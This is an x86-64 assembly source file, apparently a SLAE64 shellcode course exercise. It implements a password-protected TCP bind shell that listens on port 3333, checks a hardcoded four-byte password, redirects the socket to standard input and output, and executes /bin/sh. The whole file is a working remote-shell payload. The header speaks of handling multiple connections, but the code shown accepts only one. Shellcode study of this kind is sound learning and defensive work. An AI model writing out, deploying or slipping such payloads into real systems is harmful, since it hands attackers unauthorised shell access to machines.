; Filename: ShellBindTcp.nasm
; Author:  SLAE64 - 1525
;
; Purpose: spawn /bin/sh on tcp port handling multiple connections with password
BITS 64

global _start			

section .text

; settings
PASSWORD equ 'abcd'
PORT equ 0x050d ; default 3333

; syscall kernel opcodes
SYS_SOCKET equ 0x29
SYS_BIND equ 0x31
SYS_LISTEN equ 0x32
SYS_ACCEPT equ 0x2b
SYS_DUP2 equ 0x21
SYS_EXECVE equ 0x3b
SYS_RECVMMSG equ 0x151
SYS_EXIT equ 0x3C

; syscall constants
AF_INET equ 0x2
SOCK_STREAM equ 0x1
IPPROTO_TCP equ 0x6

_start:

create_socket:
    ; Socket
    ;   RAX       RAX    RDI       RSI           RDX
    ; soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    push SYS_SOCKET
    pop rax
    push AF_INET
    pop rdi
    push SOCK_STREAM
    pop rsi
    push IPPROTO_TCP
    pop rdx
    syscall 
    
    mov rdi, rax ; save socket descriptor in rdi

struct_sockaddr:
    ; struct sockaddr = {AF_INET; PORT; 0x0; 0x0}
    xor rax, rax
    mov dword [rsp-4], eax ;INADDR_ANY
    mov word  [rsp-6], PORT ; htons(3333) -> word = 2bytes
    mov byte  [rsp-8], AF_INET ; AF_INET -> word = 2bytes
    sub rsp, 0x8

    mov rsi, rsp ; rsi = &sockaddr

bind_port:
    ;  RAX   RDI                 RSI                      RDX
    ; bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    
    push SYS_BIND
    pop rax

    ; rdi already set
    ; rsi already set

    push 0
    push 16
    pop rdx

    syscall

server_listen:
    ;   RAX      RAX    RDI   RSI
    ; soc_rc = listen(soc_des, 5)
    push SYS_LISTEN
    pop rax

    ; rdi already setup

    push 5
    pop rsi

    syscall

accept_handler:
    ;   RAX       RAX    RDI                  RSI                   RDX
    ; soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len)
    push SYS_ACCEPT
    pop rax

    ; rdi already setup

    push 0
    pop rsi 

    push 16
    pop rdx

    syscall

    ; save in rdi
    push rax
    pop rdi

    ; equivalent with read of strncmp(data, password, len(password))
password_check:
    push rsp
    pop rsi ; rsi = &buf (char*)
    push 0x10 ; rdx = 0x10, >=8 bytes
    pop rdx
                                    
    xor eax, eax ; SYS_READ = 0x0
    syscall

    cmp dword [rsp], PASSWORD ; simple comparison
    jne parent_or_error ; bad pw, abort


dup2:
    ; rax    rdi   rsi 
    ; dup2(soc_cli,0); // standard input
    push SYS_DUP2
    pop rax
    push 0
    pop rsi

    syscall

    ; rax    rdi   rsi 
    ; dup2(soc_cli,1); // standard output
    push SYS_DUP2
    pop rax
    push 1
    pop rsi

    syscall

    ; rax    rdi   rsi 
    ; dup2(soc_cli,2); // standard error
    push SYS_DUP2
    pop rax
    push 2
    pop rsi

    syscall

exec_shell:
    ; rax      rdi     rsi    rdx
    ; execl("/bin/sh","sh",(char *)0);

    xor rsi, rsi ; *argv[] = 0

    push rsi ; '\0'
    mov rdi, 0x68732f2f6e69622f ; hs//bin/
    push rdi ; str        
    mov rdi, rsp  ; rdi = &str (char*)

    push rsi
    mov rdx, rsp ; *envp[] = 0

    push rdi 
    mov rsi, rsp

    push byte SYS_EXECVE
    pop rax
    syscall

parent_or_error:
    ;  rax
    ; exit()
    push SYS_EXIT
    pop rax

    syscall